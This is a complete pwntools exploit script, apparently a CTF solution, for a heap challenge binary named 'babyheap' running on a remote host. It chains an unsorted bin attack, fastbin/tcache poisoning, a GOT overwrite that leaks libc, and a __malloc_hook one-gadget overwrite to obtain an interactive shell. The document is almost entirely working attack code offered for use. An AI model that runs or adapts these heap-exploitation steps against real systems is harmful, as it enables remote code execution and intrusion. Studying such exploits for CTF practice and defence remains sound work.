#!/usr/bin/env python2

from pwn import *

BINARY = './babyheap'
HOST, PORT = '51.158.118.84', 17001

elf = ELF(BINARY)
libc = ELF('./libc.so.6')

def start():
	if not args.REMOTE:
		print "LOCAL PROCESS"
		return process(BINARY)
	else:
		print "REMOTE PROCESS"
		return remote(HOST, PORT)

def get_base_address(proc):
	return int(open("/proc/{}/maps".format(proc.pid), 'rb').readlines()[0].split('-')[0], 16)

def debug(breakpoints):
    script = "handle SIGALRM ignore\n"
    PIE = get_base_address(p)
    script += "set $_base = 0x{:x}\n".format(PIE)
    for bp in breakpoints:
        script += "b *0x%x\n"%(PIE+bp)
    gdb.attach(p,gdbscript=script)

def add(idx, size, data):
	p.sendlineafter('>> ', '1')
	p.sendlineafter(':\n', str(idx))
	p.sendlineafter(':\n', str(size))
	p.sendafter(':\n', data)

def edit(idx, data):
	p.sendlineafter('>> ', '2')
	p.sendlineafter(':\n', str(idx))
	p.sendafter(':\n', data)

def free(idx):
	p.sendlineafter('>> ', '3')
	p.sendlineafter(':\n', str(idx))

context.arch = 'amd64'
context.terminal = ['tmux', 'new-window']

printf = elf.plt['printf']
free_got = elf.got['free']
atoi_got = elf.got['atoi']

while True:
	p = start()
	add(0, 0x30, 'A'*0x30) # Used for unsorted bin attack
	add(1, 0x68, 'B'*0x68) # Used for fastbin dup later on

	free(0) # Send chunk A to the unsorted bin

	# Overwrite A's bk with bruteforced &global_max_fast - 0x10
	edit(0, '\x00'*8 + p16(0x27e8))

	try:
		# Launch the unsorted bin attack
		add(2, 0x30, 'C'*0x30)

		# If the unsorted bin attack successfully overwrote global_max_fast,
		# Then we can do a tcache poisoning attack to get a chunk right above the
		# global data array
		#
		# If we successfully get the chunk there, overwrite idx 0 with free@got
		free(1)
		edit(1, p64(0x6020cd-0x10))
		add(3, 0x68, 'Z'*8)
		add(4, 0x68, 'Z'*0x53 + p64(free_got))
		if args.GDB:
			debug([])
		break
	except:
		# If it didn't work, close the process and try again
		p.close()
		continue

free(3) # Prep for next fastbin poisoning attack
edit(0, p64(printf)) # Overwrite free with printf
edit(4, 'Z'*0x53 + p64(0x602020)) # Change idx 0 to puts@got
free(0) # printf(puts@got)

libc.address = u64(p.recv(6).ljust(8, '\x00')) - libc.sym['puts']
log.info('Libc base: ' + hex(libc.address))

edit(3, p64(libc.sym['__malloc_hook']-0x30+0xd))

add(5, 0x68, 'Z'*8)
add(6, 0x68, 'B'*0x13 + p64(libc.address+0xf1147))

p.sendlineafter('>> ', '1')
p.sendlineafter(':\n', '8')
p.sendlineafter(':\n', '104')

p.interactive()
